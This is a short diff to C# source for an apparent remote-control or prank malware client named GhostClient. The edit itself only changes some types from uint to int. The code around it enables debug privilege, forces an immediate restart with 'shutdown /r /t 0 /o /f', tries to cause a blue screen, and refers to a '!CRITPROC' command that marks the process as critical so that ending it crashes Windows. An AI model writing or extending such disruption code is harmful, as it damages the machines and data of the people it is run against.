@@ -94,9 +94,9 @@ namespace GhostClient
         private const uint SE_PRIVILEGE_ENABLED = 0x2;
         private const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
         private const string SE_DEBUG_NAME = "SeDebugPrivilege";
-        private const uint SPI_SETDESKWALLPAPER = 20;
-        private const uint SPIF_UPDATEINIFILE = 0x01;
-        private const uint SPIF_SENDWININICHANGE = 0x02;
+        private const int SPI_SETDESKWALLPAPER = 20;
+        private const int SPIF_UPDATEINIFILE = 0x01;
+        private const int SPIF_SENDWININICHANGE = 0x02;
         private const uint SND_ASYNC = 0x0001;
         private const uint SND_FILENAME = 0x00020000;
         private const uint TOKEN_INFORMATION_CLASS_TOKEN_ELEVATION = 20;
@@ -967,8 +967,8 @@ namespace GhostClient
             try
             {
                 EnableDebugPrivilege();
-                uint major = Environment.OSVersion.Version.Major;
-                uint minor = Environment.OSVersion.Version.Minor;
+                int major = Environment.OSVersion.Version.Major;
+                int minor = Environment.OSVersion.Version.Minor;
                 if (major >= 10) return "BSOD: Not supported on this Windows version via this method.\nUse !CRITPROC instead (process will trigger BSOD if killed).";
                 Process.Start("shutdown", "/r /t 0 /o /f");
                 return "System restart initiated with advanced options";
